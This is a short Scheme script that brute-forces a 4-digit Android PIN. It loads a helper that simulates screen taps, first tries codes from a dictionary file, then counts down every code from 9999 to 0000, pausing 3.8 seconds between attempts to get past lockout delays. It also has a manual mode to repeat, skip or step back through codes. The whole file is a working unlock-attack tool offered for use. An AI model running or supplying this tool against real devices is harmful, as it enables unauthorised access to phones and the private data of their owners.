(use srfi-13)


(define cruise-control #t)
(define dict-file-name "dict.txt")
(define pin-len 4)
(define range-start 9999)
(define range-end 0000)
(define seconds-between-attempts 3.8)
(define argc 0)
(define current-arg "")
(load "parse-cli.scm")
(load "android-tap.scm")

(define direction-positive (> range-end range-start))
(define repeat-op (if direction-positive sub1 add1))
(define subtract-op (if direction-positive - +))
(define skip-op (if direction-positive add1 sub1))


(define dict '())
(define read-dict-file-ptr (if (file-exists? dict-file-name)
			       (open-input-file  dict-file-name)
			       #f))
(define i '())
(define (press-combo)
  (if (not cruise-control)
      (let ((x (read-line)))
	(when (not (string? i))
	  (cond ((equal? x "-")
		 (set! i (subtract-op i 2)))
		((equal? x "r")
		 (set! i (repeat-op i)))
		((equal? x "s")
		 (set! i (skip-op i))))))
      (z duration: seconds-between-attempts))
  (let ((i (string-pad (if (string? i) i
			   (number->string i))
		       pin-len #\0)))
    (printf "attempt: ~s~%" i)
    (process-digit-str (string-append i "#"))))

(when read-dict-file-ptr
  (define (read-dict-file)
    (let ((line (read-line read-dict-file-ptr)))
      (when (not (eq? line #!eof))
	(when (> (string-length line) 0)
	  (printf "Trying Dict Entry ")
	  (set! i line)
	  (press-combo)
	  (set! dict (append dict `(,(string->number line)))))
	(read-dict-file))))
  (read-dict-file)
  (print "Dict attempts complete!"))
  
(define (dict-entry-exists? d num)
  (if (not (null? d))
      (let* ((x (car d))
	     (num (if (string? num) (string->number num) num)))
	(if (= x num)
	    #t
	    (dict-entry-exists? (cdr d) num)))
      #f))

(define comp (if direction-positive
		 >
		 <))
(define op (if direction-positive
	       add1
	       sub1))
(do ((x range-start (op i)))
    ((comp x range-end))
  (if (and read-dict-file-ptr (dict-entry-exists? dict x))
      (printf "Skipping sequential, already processed in dict: ~A~%" x)
      (begin (printf "Trying Sequential ")
	     (set! i x)
	     (press-combo))))
(print "brute attempts complete!")
(when read-dict-file-ptr
  (file-close read-dict-file-ptr))
(exit)
